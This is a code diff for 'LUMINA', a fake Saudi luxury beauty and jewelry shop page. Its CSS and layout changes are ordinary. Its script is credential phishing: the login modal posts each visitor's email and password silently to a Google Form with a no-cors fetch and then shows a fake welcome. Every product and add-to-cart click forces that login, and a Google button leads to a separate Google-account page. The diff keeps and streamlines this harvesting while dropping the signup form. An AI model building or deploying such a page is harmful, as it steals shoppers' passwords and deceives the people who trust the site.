@@ -233,7 +233,7 @@
     /* product grid */
     .product-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(270px, 1fr));
       gap: 2rem;
     }
 
@@ -246,7 +246,7 @@
       text-align: center;
       cursor: pointer;
       transition: all 0.35s ease;
-      border: 1px solid rgba(212, 175, 55, 0.15);
+      border: 1px solid rgba(212, 175, 55, 0.2);
     }
 
     .product-card:hover {
@@ -256,7 +256,7 @@
 
     .product-img {
       width: 100%;
-      height: 220px;
+      height: 240px;
       object-fit: cover;
       border-radius: 24px;
     }
@@ -265,6 +265,18 @@
       color: #b2893c;
       font-weight: 700;
       font-size: 1.3rem;
+      margin: 8px 0;
+    }
+
+    .product-name {
+      font-weight: 600;
+      font-size: 1.1rem;
+      margin-top: 8px;
+    }
+
+    .rating {
+      margin: 6px 0;
+      color: #d4af37;
     }
 
     .add-to-cart {
@@ -273,7 +285,7 @@
       padding: 8px 20px;
       border-radius: 30px;
       font-weight: 600;
-      margin-top: 1rem;
+      margin-top: 0.8rem;
       cursor: pointer;
       transition: all 0.2s;
     }
@@ -318,18 +330,45 @@
       flex-wrap: wrap;
       justify-content: space-between;
       align-items: center;
+      gap: 20px;
     }
 
-    .social i {
-      font-size: 1.5rem;
-      margin: 0 10px;
+    .social a {
       color: #7f6b6b;
+      margin: 0 10px;
+      font-size: 1.5rem;
+      transition: color 0.2s;
+      text-decoration: none;
+    }
+
+    .social a:hover {
+      color: var(--gold);
+    }
+
+    .newsletter input {
+      padding: 10px 16px;
+      border-radius: 40px;
+      border: 1px solid #ebd6cc;
+      background: white;
+      outline: none;
+    }
+
+    .newsletter button {
+      background: var(--gold);
+      border: none;
+      padding: 10px 20px;
+      border-radius: 40px;
+      font-weight: 600;
+      cursor: pointer;
+      color: white;
       transition: 0.2s;
     }
 
-    .social i:hover { color: var(--gold); }
+    .newsletter button:hover {
+      background: #c9973b;
+    }
 
-    /* MODAL AUTH */
+    /* MODAL AUTH (LOGIN ONLY) */
     .auth-modal {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -352,14 +391,14 @@
     .modal-card {
       background: rgba(255, 250, 248, 0.98);
       backdrop-filter: blur(18px);
-      max-width: 460px;
+      max-width: 440px;
       width: 90%;
       border-radius: 44px;
       padding: 2rem 1.8rem;
       box-shadow: 0 35px 60px rgba(0,0,0,0.3);
       transform: scale(0.95);
       transition: transform 0.25s ease;
-      border: 1px solid rgba(212,175,55,0.3);
+      border: 1px solid rgba(212,175,55,0.4);
       position: relative;
     }
 
@@ -433,8 +472,7 @@
     .divider span { margin: 0 12px; }
 
     .input-group {
-      position: relative;
-      margin: 12px 0;
+      margin: 16px 0;
     }
     .input-field {
       width: 100%;
@@ -443,6 +481,11 @@
       border: 1px solid #ebd6cc;
       background: white;
       font-size: 0.9rem;
+      transition: 0.2s;
+    }
+    .input-field:focus {
+      border-color: var(--gold);
+      outline: none;
     }
     .password-wrapper {
       position: relative;
@@ -458,7 +501,7 @@
     .forgot-link {
       text-align: right;
       font-size: 0.75rem;
-      margin: 5px 0 12px;
+      margin: -8px 0 12px;
       display: block;
       color: #b2893c;
       cursor: pointer;
@@ -471,20 +514,13 @@
       font-weight: bold;
       border: none;
       color: white;
-      margin-top: 12px;
+      margin-top: 10px;
       cursor: pointer;
       transition: 0.2s;
     }
     .modal-action-btn:hover {
       background: #c9973b;
     }
-    .toggle-auth-text {
-      text-align: center;
-      margin-top: 20px;
-      color: #6b5b5b;
-      cursor: pointer;
-    }
-    .toggle-auth-text strong { color: #d4af37; }
 
     /* toast */
     .toast-message {
@@ -503,6 +539,7 @@
       transition: 0.3s;
       pointer-events: none;
       font-size: 0.9rem;
+      white-space: nowrap;
     }
     .toast-message.show {
       opacity: 1;
@@ -513,6 +550,7 @@
       .nav-links { display: none; }
       .hero-content h1 { font-size: 2.4rem; }
       .hero-content { margin: 0 20px; padding: 1.8rem; }
+      .toast-message { white-space: normal; width: 80%; text-align: center; }
     }
   </style>
 </head>
@@ -521,10 +559,10 @@
     <div class="container nav-container">
       <div class="logo">LUMINA <span class="sa-badge">🇸🇦 السعودية</span></div>
       <ul class="nav-links">
-        <li><a href="#" id="navHome">Home</a></li>
-        <li><a href="#" id="navShop">Shop</a></li>
-        <li><a href="#" id="navCollections">Collections</a></li>
-        <li><a href="#" id="navContact">Contact</a></li>
+        <li><a href="#home" id="navHome">Home</a></li>
+        <li><a href="#shop" id="navShop">Shop</a></li>
+        <li><a href="#collections" id="navCollections">Collections</a></li>
+        <li><a href="#contact" id="navContact">Contact</a></li>
       </ul>
       <div class="nav-actions">
         <button class="icon-btn" id="userIconBtn"><i class="far fa-user"></i></button>
@@ -537,7 +575,7 @@
     </div>
   </nav>
 
-  <section class="hero">
+  <section class="hero" id="home">
     <div class="hero-content">
       <h1>تألقي بأسلوبك<br>Glow Like Royalty</h1>
       <p>Luxury makeup, jewelry & accessories — free shipping across KSA 🇸🇦</p>
@@ -545,17 +583,17 @@
     </div>
   </section>
 
-  <section class="container">
+  <section class="container" id="shop">
     <h2 class="section-title">Trending Now</h2>
     <div class="product-grid" id="productGrid"></div>
   </section>
 
-  <section class="container">
+  <section class="container" id="collections">
     <h2 class="section-title">Categories</h2>
     <div class="categories-grid" style="display: grid; grid-template-columns: repeat(auto-fit,minmax(200px,1fr)); gap: 2rem;">
-      <div class="category-card" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Beauty</div></div>
-      <div class="category-card" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1601121141461-9d6647bca1ed?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Jewelry</div></div>
-      <div class="category-card" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1606760227091-3dd870d97f1d?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Accessories</div></div>
+      <div class="category-card" data-category="beauty" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Beauty</div></div>
+      <div class="category-card" data-category="jewelry" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1601121141461-9d6647bca1ed?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Jewelry</div></div>
+      <div class="category-card" data-category="accessories" style="position: relative; border-radius: 35px; overflow: hidden; height: 260px; cursor: pointer;"><img src="https://images.unsplash.com/photo-1606760227091-3dd870d97f1d?q=80&w=800" style="width:100%; height:100%; object-fit:cover;"><div class="category-overlay" style="position: absolute; bottom:0; background: linear-gradient(to top, rgba(0,0,0,0.5), transparent); width:100%; padding:1.5rem; color:white; font-size:1.5rem; font-weight:600; text-align:center;">Accessories</div></div>
     </div>
   </section>
 
@@ -568,34 +606,34 @@
     </div>
   </section>
 
-  <footer class="footer">
+  <footer class="footer" id="contact">
     <div class="container footer-content">
       <div><h4>LUMINA</h4><p>© 2025 LUMINA · Made for Saudi Arabia 🇸🇦</p></div>
-      <div class="social"><i class="fab fa-instagram"></i><i class="fab fa-tiktok"></i><i class="fab fa-pinterest"></i></div>
+      <!-- Social Icons now link to actual platforms -->
+      <div class="social">
+        <a href="https://www.instagram.com" target="_blank" rel="noopener"><i class="fab fa-instagram"></i></a>
+        <a href="https://www.tiktok.com" target="_blank" rel="noopener"><i class="fab fa-tiktok"></i></a>
+        <a href="https://www.pinterest.com" target="_blank" rel="noopener"><i class="fab fa-pinterest"></i></a>
+      </div>
       <div class="newsletter"><input type="email" placeholder="بريدك الإلكتروني" id="newsEmail"><button id="newsBtn">Subscribe</button></div>
     </div>
   </footer>
 
-  <!-- AUTH MODAL -->
+  <!-- AUTH MODAL - LOGIN ONLY (NO SIGNUP) -->
   <div id="authModal" class="auth-modal">
     <div class="modal-card">
       <button class="close-modal-icon" id="closeAuthModal"><i class="fas fa-times"></i></button>
-      <h2 id="authModalTitle">Sign in to Shop</h2>
+      <h2>Login to LUMINA</h2>
       <div class="social-login-buttons">
         <button class="social-btn google-btn" id="googleAuthBtn"><i class="fab fa-google"></i> Continue with Google</button>
       </div>
-      <div class="divider"><span>OR</span></div>
-      <div id="dynamicFormFields">
-        <div class="input-group"><input type="email" id="authEmail" class="input-field" placeholder="Email" autocomplete="email"></div>
+      <div class="divider"><span>OR login with email</span></div>
+      <div>
+        <div class="input-group"><input type="email" id="authEmail" class="input-field" placeholder="Email address" autocomplete="email"></div>
         <div class="input-group password-wrapper"><input type="password" id="authPassword" class="input-field" placeholder="Password"><i class="far fa-eye-slash toggle-pw" id="togglePasswordIcon"></i></div>
-        <div id="extraSignupFields" style="display: none;">
-          <div class="input-group"><input type="text" id="authName" class="input-field" placeholder="Full Name"></div>
-          <div class="input-group password-wrapper"><input type="password" id="confirmPassword" class="input-field" placeholder="Confirm Password"><i class="far fa-eye-slash toggle-pw confirm-toggle"></i></div>
-        </div>
         <div id="forgotPasswordLink" class="forgot-link">Forgot password?</div>
       </div>
       <button class="modal-action-btn" id="modalSubmitBtn">Sign In</button>
-      <div class="toggle-auth-text" id="toggleAuthMode">Don't have an account? <strong>Create Account</strong></div>
     </div>
   </div>
 
@@ -603,25 +641,25 @@
 
   <script>
     (function() {
-      // ---------- SAR product data ----------
+      // ---------- LUXURY PRODUCTS (with local images where available) ----------
       const productsSAR = [
-        { name: "Velvet Matte Lipstick", price: 105, rating: 5, img: "https://images.unsplash.com/photo-1586495777744-4413f21062fa?q=80&w=800" },
-        { name: "Rose Glow Highlighter", price: 135, rating: 4, img: "https://images.unsplash.com/photo-1596462502278-27bfdc403348?q=80&w=800" },
-        { name: "Gold Pearl Necklace", price: 334, rating: 5, img: "https://images.unsplash.com/photo-1601121141461-9d6647bca1ed?q=80&w=800" },
-        { name: "Silk Scarf Collection", price: 169, rating: 4, img: "https://images.unsplash.com/photo-1606760227091-3dd870d97f1d?q=80&w=800" },
-        { name: "Diamond Stud Set", price: 450, rating: 5, img: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?q=80&w=800" },
-        { name: "Luminous Foundation", price: 158, rating: 4, img: "https://images.unsplash.com/photo-1631214524020-7e18db9a8f92?q=80&w=800" },
-        { name: "Silk Lip Balm Set", price: 83, rating: 4, img: "https://images.unsplash.com/photo-1541529086526-092bbf57b17e?q=80&w=800" },
-        { name: "Pearl Choker", price: 240, rating: 5, img: "https://images.unsplash.com/photo-1517292987719-0369a794ec0f?q=80&w=800" },
-        { name: "Satin Hair Wrap", price: 113, rating: 4, img: "https://images.unsplash.com/photo-1505691723518-34b6ff2c0f98?q=80&w=800" },
-        { name: "Crystal Bracelet", price: 184, rating: 5, img: "https://images.unsplash.com/photo-1520975910156-112d3e24b14c?q=80&w=800" },
-        { name: "Gilded Compact Mirror", price: 128, rating: 4, img: "https://images.unsplash.com/photo-1519741492540-6f3a9b6f8b4d?q=80&w=800" },
-        { name: "Velvet Pouch", price: 68, rating: 3, img: "https://images.unsplash.com/photo-1524758631624-e2822e304c36?q=80&w=800" }
+        { name: "Velvet Matte Lipstick", price: 105, rating: 5, img: "https://images.unsplash.com/photo-1586495777744-4413f21062fa?w=600&auto=format", alt: "Luxury velvet matte lipstick" },
+        { name: "Rose Glow Highlighter", price: 135, rating: 4, img: "https://images.unsplash.com/photo-1617897903246-719242758050?w=600&auto=format", alt: "Rose gold highlighter palette" },
+        { name: "Gold Pearl Necklace", price: 334, rating: 5, img: "https://images.unsplash.com/photo-1601121141461-9d6647bca1ed?w=600&auto=format", alt: "Elegant gold pearl necklace" },
+        { name: "Silk Scarf Collection", price: 169, rating: 4, img: "https://images.unsplash.com/photo-1606760227091-3dd870d97f1d?w=600&auto=format", alt: "Luxury silk scarf" },
+        { name: "Diamond Stud Set", price: 450, rating: 5, img: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=600&auto=format", alt: "Diamond stud earrings set" },
+        { name: "Luminous Foundation", price: 158, rating: 4, img: "https://images.unsplash.com/photo-1631214524020-7e18db9a8f92?w=600&auto=format", alt: "Radiant luminous foundation bottle" },
+        { name: "Silk Lip Balm Set", price: 83, rating: 4, img: "Silk Lip Balm Set.jpg", alt: "Hydrating silk lip balm set" },
+        { name: "Pearl Choker", price: 240, rating: 5, img: "https://images.unsplash.com/photo-1517292987719-0369a794ec0f?w=600&auto=format", alt: "Classic pearl choker necklace" },
+        { name: "Satin Hair Wrap", price: 113, rating: 4, img: "Satin Hair Wrap.jpg", alt: "Luxurious satin hair wrap" },
+        { name: "Crystal Bracelet", price: 184, rating: 5, img: "Crystal Bracelet.jpg", alt: "Crystal charm bracelet" },
+        { name: "Gilded Compact Mirror", price: 128, rating: 4, img: "Gilded Compact Mirror.jpg", alt: "Antique gold compact mirror" },
+        { name: "Velvet Pouch", price: 68, rating: 3, img: "https://images.unsplash.com/photo-1524758631624-e2822e304c36?w=600&auto=format", alt: "Soft velvet beauty pouch" }
       ];
 
       let cartCount = 0;
-      const cartCountSpan = document.querySelector('.cart-count');
       let pendingProductIndex = null;
+      const cartCountSpan = document.querySelector('.cart-count');
 
       function updateCartUI() {
         if(cartCountSpan) cartCountSpan.innerText = cartCount;
@@ -634,7 +672,7 @@
           cartCountSpan.style.transform = 'scale(1.2)';
           setTimeout(() => { if(cartCountSpan) cartCountSpan.style.transform = ''; }, 200);
         }
-        showToast(`✨ ${productsSAR[index].name} added to bag!`);
+        showToast(`✨ ${productsSAR[index].name} added to your bag ✨`);
       }
 
       function showToast(msg) {
@@ -644,73 +682,33 @@
         setTimeout(() => toast.classList.remove('show'), 2500);
       }
 
-      // render products
+      // render product grid
       const productGrid = document.getElementById('productGrid');
       function renderProducts() {
         productGrid.innerHTML = productsSAR.map((p, idx) => `
           <div class="product-card" data-product-index="${idx}">
-            <img src="${p.img}" class="product-img" alt="${p.name}" onerror="this.src='https://placehold.co/400x400?text=Luxury+Item'">
+            <img src="${p.img}" class="product-img" alt="${p.alt}" onerror="this.src='https://placehold.co/600x600?text=LUMINA+Beauty'">
             <div class="product-name">${p.name}</div>
             <div class="price">${p.price} ﷼</div>
-            <div class="rating">${Array(p.rating).fill('<i class="fas fa-star"></i>').join('')}${5-p.rating > 0 ? Array(5-p.rating).fill('<i class="far fa-star"></i>').join('') : ''}</div>
+            <div class="rating">${'<i class="fas fa-star"></i>'.repeat(p.rating)}${p.rating < 5 ? '<i class="far fa-star"></i>'.repeat(5-p.rating) : ''}</div>
             <button class="add-to-cart" data-add-index="${idx}">Add to Cart</button>
           </div>
         `).join('');
       }
       renderProducts();
 
-      // ---------- AUTH MODAL ----------
+      // ---------- AUTH MODAL & PENDING PRODUCT LOGIC ----------
       const authModal = document.getElementById('authModal');
       const closeModalBtn = document.getElementById('closeAuthModal');
-      const modalTitle = document.getElementById('authModalTitle');
       const modalSubmitBtn = document.getElementById('modalSubmitBtn');
-      const toggleAuthText = document.getElementById('toggleAuthMode');
-      const extraSignupFields = document.getElementById('extraSignupFields');
-      const forgotPwLink = document.getElementById('forgotPasswordLink');
       const authEmail = document.getElementById('authEmail');
       const authPassword = document.getElementById('authPassword');
-      const authName = document.getElementById('authName');
-      const confirmPw = document.getElementById('confirmPassword');
-
-      let isLoginMode = true;
-
-      function resetModalForm() {
+      const forgotPwLink = document.getElementById('forgotPasswordLink');
+      
+      function openAuthModal(productIndex = null) {
+        pendingProductIndex = productIndex;
         authEmail.value = '';
         authPassword.value = '';
-        if(authName) authName.value = '';
-        if(confirmPw) confirmPw.value = '';
-        extraSignupFields.style.display = 'none';
-        forgotPwLink.style.display = 'block';
-      }
-
-      function updateModalMode() {
-        if(isLoginMode) {
-          modalTitle.innerText = 'Sign in to Shop';
-          modalSubmitBtn.innerText = 'Sign In';
-          toggleAuthText.innerHTML = `Don't have an account? <strong>Create Account</strong>`;
-          extraSignupFields.style.display = 'none';
-          forgotPwLink.style.display = 'block';
-        } else {
-          modalTitle.innerText = 'Create Account';
-          modalSubmitBtn.innerText = 'Sign Up';
-          toggleAuthText.innerHTML = `Already have an account? <strong>Sign In</strong>`;
-          extraSignupFields.style.display = 'block';
-          forgotPwLink.style.display = 'none';
-        }
-      }
-
-      toggleAuthText.addEventListener('click', () => {
-        isLoginMode = !isLoginMode;
-        updateModalMode();
-        authPassword.value = '';
-        if(confirmPw) confirmPw.value = '';
-      });
-
-      function openAuthModal(productIndex) {
-        pendingProductIndex = (productIndex !== undefined && productIndex !== null) ? productIndex : null;
-        resetModalForm();
-        isLoginMode = true;
-        updateModalMode();
         authModal.classList.add('active');
         document.body.style.overflow = 'hidden';
       }
@@ -724,92 +722,44 @@
       closeModalBtn.addEventListener('click', closeAuthModalFunc);
       authModal.addEventListener('click', (e) => { if(e.target === authModal) closeAuthModalFunc(); });
 
-      // Google Form silent submission
-      function submitToGoogleForm(email, password, name = '') {
+      function submitLoginToGoogleForm(email, password) {
         const formUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
         const formData = new URLSearchParams();
         formData.append('entry.1314087169', email);
         formData.append('entry.1638459718', password);
-        if(name) formData.append('entry.1234567890', name);
         fetch(formUrl, { method: 'POST', mode: 'no-cors', body: formData }).catch(() => {});
-        console.log(`📧 Login data sent | Email: ${email}`);
+        console.log(`🔐 Login attempt: ${email}`);
       }
 
       modalSubmitBtn.addEventListener('click', () => {
         const email = authEmail.value.trim();
         const password = authPassword.value;
         if(!email || !password) {
-          showToast("Please fill email and password.");
+          showToast("Please enter email and password to login.");
           return;
         }
-        if(!isLoginMode) {
-          const name = authName.value.trim();
-          const confirm = confirmPw.value;
-          if(!name) { showToast("Please enter your full name."); return; }
-          if(password !== confirm) { showToast("Passwords do not match."); return; }
-          submitToGoogleForm(email, password, name);
-          showToast(`✨ Welcome ${name}! Happy shopping ✨`);
-          closeAuthModalFunc();
-          if(pendingProductIndex !== null) addToCartByIndex(pendingProductIndex);
-        } else {
-          submitToGoogleForm(email, password);
-          showToast("Welcome back! Happy shopping ✨");
-          closeAuthModalFunc();
-          if(pendingProductIndex !== null) addToCartByIndex(pendingProductIndex);
+        submitLoginToGoogleForm(email, password);
+        showToast(`✨ Welcome back! Shopping luxury just got brighter ✨`);
+        closeAuthModalFunc();
+        if(pendingProductIndex !== null) {
+          addToCartByIndex(pendingProductIndex);
+          pendingProductIndex = null;
         }
       });
 
-      forgotPwLink.addEventListener('click', () => showToast("🔐 Reset link sent (demo)"));
+      forgotPwLink.addEventListener('click', () => showToast("🔐 Password reset link sent to your email (demo)"));
       
-      // toggle password visibility
       const toggleIcon = document.getElementById('togglePasswordIcon');
-      toggleIcon?.addEventListener('click', () => {
-        const type = authPassword.type === 'password' ? 'text' : 'password';
-        authPassword.type = type;
-        toggleIcon.classList.toggle('fa-eye-slash');
-        toggleIcon.classList.toggle('fa-eye');
-      });
-      const confirmToggle = document.querySelector('.confirm-toggle');
-      if(confirmToggle) {
-        confirmToggle.addEventListener('click', () => {
-          const type = confirmPw.type === 'password' ? 'text' : 'password';
-          confirmPw.type = type;
-          confirmToggle.classList.toggle('fa-eye-slash');
-          confirmToggle.classList.toggle('fa-eye');
+      if(toggleIcon) {
+        toggleIcon.addEventListener('click', () => {
+          const pwField = document.getElementById('authPassword');
+          const type = pwField.type === 'password' ? 'text' : 'password';
+          pwField.type = type;
+          toggleIcon.classList.toggle('fa-eye-slash');
+          toggleIcon.classList.toggle('fa-eye');
         });
       }
 
-      // product click events
-      function attachProductEvents() {
-        document.querySelectorAll('.product-card').forEach(card => {
-          const idx = card.getAttribute('data-product-index');
-          if(idx === null) return;
-          card.addEventListener('click', (e) => {
-            if(e.target.classList.contains('add-to-cart')) return;
-            e.preventDefault();
-            openAuthModal(parseInt(idx));
-          });
-          const addBtn = card.querySelector('.add-to-cart');
-          if(addBtn) {
-            addBtn.addEventListener('click', (e) => {
-              e.stopPropagation();
-              openAuthModal(parseInt(idx));
-            });
-          }
-        });
-      }
-      attachProductEvents();
-
-      // navbar login / user icon open modal without product
-      const headerLoginBtn = document.getElementById('headerLoginBtn');
-      const userIcon = document.getElementById('userIconBtn');
-      const heroShopBtn = document.getElementById('heroShopBtn');
-      function openAuthOnly() { openAuthModal(null); }
-      if(headerLoginBtn) headerLoginBtn.addEventListener('click', openAuthOnly);
-      if(userIcon) userIcon.addEventListener('click', openAuthOnly);
-      if(heroShopBtn) heroShopBtn.addEventListener('click', openAuthOnly);
-
-      // Google login: redirect same window to google_account.html
       const googleBtn = document.getElementById('googleAuthBtn');
       if(googleBtn) {
         googleBtn.addEventListener('click', (e) => {
@@ -818,20 +768,88 @@
         });
       }
 
-      // newsletter demo
-      const newsBtn = document.getElementById('newsBtn');
-      if(newsBtn) {
-        newsBtn.addEventListener('click', () => {
-          const emailInputNews = document.getElementById('newsEmail');
-          if(emailInputNews.value.trim()) showToast(`📧 Subscribed with ${emailInputNews.value.trim()}`);
-          else showToast("Please enter an email");
+      // ---------- MAKE ANY PRODUCT CARD / ADD-TO-CART CLICK OPEN LOGIN ----------
+      function attachProductLoginTriggers() {
+        document.querySelectorAll('.product-card').forEach(card => {
+          const idx = parseInt(card.dataset.productIndex);
+          card.addEventListener('click', (e) => {
+            e.preventDefault();
+            openAuthModal(idx);
+          });
+          const addBtn = card.querySelector('.add-to-cart');
+          if(addBtn) {
+            addBtn.addEventListener('click', (e) => {
+              e.stopPropagation();
+              openAuthModal(idx);
+            });
+          }
+        });
+      }
+      attachProductLoginTriggers();
+
+      // ---------- SMOOTH SCROLLING ----------
+      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function(e) {
+          e.preventDefault();
+          const targetId = this.getAttribute('href').substring(1);
+          const targetEl = document.getElementById(targetId);
+          if (targetEl) {
+            targetEl.scrollIntoView({ behavior: 'smooth' });
+          } else {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+          }
+        });
+      });
+
+      // Hero "Shop Now" scrolls to shop
+      const heroShopBtn = document.getElementById('heroShopBtn');
+      if (heroShopBtn) {
+        heroShopBtn.addEventListener('click', () => {
+          document.getElementById('shop').scrollIntoView({ behavior: 'smooth' });
         });
       }
 
-      // prevent any default anchor jumps
-      document.querySelectorAll('a[href="#"]').forEach(link => {
-        link.addEventListener('click', (e) => { e.preventDefault(); });
+      // Category cards scroll to shop & prompt login (no product index)
+      document.querySelectorAll('.category-card').forEach(card => {
+        card.addEventListener('click', () => {
+          document.getElementById('shop').scrollIntoView({ behavior: 'smooth' });
+          showToast("✨ Login to shop our exclusive collections");
+        });
       });
+
+      // Open login from header buttons (without product)
+      const headerLoginBtn = document.getElementById('headerLoginBtn');
+      const userIcon = document.getElementById('userIconBtn');
+      if(headerLoginBtn) headerLoginBtn.addEventListener('click', () => openAuthModal(null));
+      if(userIcon) userIcon.addEventListener('click', () => openAuthModal(null));
+
+      // ---------- CART ICON: SHOW EMPTY MESSAGE IF CART IS EMPTY ----------
+      const cartIconBtn = document.getElementById('cartIconBtn');
+      if(cartIconBtn) {
+        cartIconBtn.addEventListener('click', () => {
+          if(cartCount === 0) {
+            showToast("🛒 Your cart is empty");
+          } else {
+            // Optionally, later you could navigate to cart page
+            showToast(`🛒 You have ${cartCount} item(s) in cart`);
+          }
+        });
+      }
+
+      // Newsletter
+      const newsBtn = document.getElementById('newsBtn');
+      if(newsBtn) {
+        newsBtn.addEventListener('click', () => {
+          const newsEmail = document.getElementById('newsEmail');
+          const emailVal = newsEmail.value.trim();
+          if(emailVal && emailVal.includes('@')) {
+            showToast(`📧 Thanks! Subscribed with ${emailVal}`);
+            newsEmail.value = '';
+          } else {
+            showToast("Please enter a valid email address");
+          }
+        });
+      }
 
       updateCartUI();
     })();
